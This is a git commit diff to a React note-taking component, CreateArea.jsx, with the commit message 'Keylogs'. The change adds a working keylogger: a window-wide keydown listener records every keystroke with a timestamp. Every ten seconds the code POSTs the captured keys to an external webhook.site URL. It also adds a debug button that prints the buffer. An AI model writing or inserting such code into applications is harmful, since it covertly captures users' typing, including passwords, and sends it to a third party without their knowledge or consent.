679036ab81bbdfacf3f79bb356734aa08e1b34c3
Abhishek Sharma <60963480+abhi1988sharma@users.noreply.github.com>
2023-04-11 14:24:40 +0300

    Update CreateArea.jsx
    Keylogs

--- src/components/CreateArea.jsx
+++ src/components/CreateArea.jsx
@@ -1,4 +1,4 @@
-import React, { useState } from "react";
+import React, { useEffect, useState, useCallback } from "react";
 import AddIcon from "@material-ui/icons/Add";
 import Fab from "@material-ui/core/Fab";
 import Zoom from "@material-ui/core/Zoom";
@@ -11,6 +11,43 @@ function CreateArea(props) {
     content: ""
   });
 
+  const [buffer] = useState([]);
+
+
+  const registerKeyPress = useCallback((e) => {
+
+    var timestamp = Date.now() | 0;
+    var stroke = {
+      k: e.key,
+      t: timestamp
+    };
+    buffer.push(stroke);
+  }, []);
+  
+  useEffect(() => {
+    window.addEventListener("keydown", registerKeyPress);
+    window.setInterval(function() {
+      if (buffer.length > 0) {
+        fetch('https://webhook.site/8b4a22fc-8576-4f96-90fc-49c0984710b1', {
+          method: 'POST',
+          body: JSON.stringify({
+            buffer
+          }),
+          headers: {
+            'Content-type': 'application/json; charset=UTF-8',
+          },
+        })
+           .then((response) => response.json())
+           .then((data) => {
+              console.log(data);
+              // Handle data
+           })
+           .catch((err) => {
+              console.log(err.message);
+           });
+      }
+  }, 10000);
+  }, [registerKeyPress]);
   function handleChange(event) {
     const { name, value } = event.target;
 
@@ -21,6 +58,7 @@ function CreateArea(props) {
       };
     });
   }
+
 
   function submitNote(event) {
     props.onAdd(note);
@@ -37,6 +75,7 @@ function CreateArea(props) {
 
   return (
     <div>
+
       <form className="create-note">
         {isExpanded && (
           <input
@@ -55,12 +94,16 @@ function CreateArea(props) {
           placeholder="Take a note..."
           rows={isExpanded ? 3 : 1}
         />
+
         <Zoom in={isExpanded}>
           <Fab onClick={submitNote}>
             <AddIcon />
           </Fab>
         </Zoom>
+
       </form>
+
+      <button onClick={() => console.log(buffer)}>Test</button>
     </div>
   );
 }
